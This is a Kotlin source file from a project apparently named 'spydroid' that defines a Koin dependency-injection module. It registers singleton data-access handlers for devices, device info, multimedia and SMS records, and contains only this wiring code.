package net.spydroid.common.remote.network

import net.spydroid.common.remote.network.daos.DevicesDao
import net.spydroid.common.remote.network.daos.InfoDevicesDao
import net.spydroid.common.remote.network.daos.MultimediaDevicesDao
import net.spydroid.common.remote.network.daos.SmsDevicesDao
import net.spydroid.common.remote.network.data.DevicesDaoHandler
import net.spydroid.common.remote.network.data.InfoDevicesDaoHandler
import net.spydroid.common.remote.network.data.MultimediaDevicesDaoHandler
import net.spydroid.common.remote.network.data.SmsDevicesDaoHandler
import org.koin.dsl.module


val networkModule = module {
    single<DevicesDao> { DevicesDaoHandler() }
    single<InfoDevicesDao> { InfoDevicesDaoHandler() }
    single<MultimediaDevicesDao> { MultimediaDevicesDaoHandler() }
    single<SmsDevicesDao> { SmsDevicesDaoHandler() }
}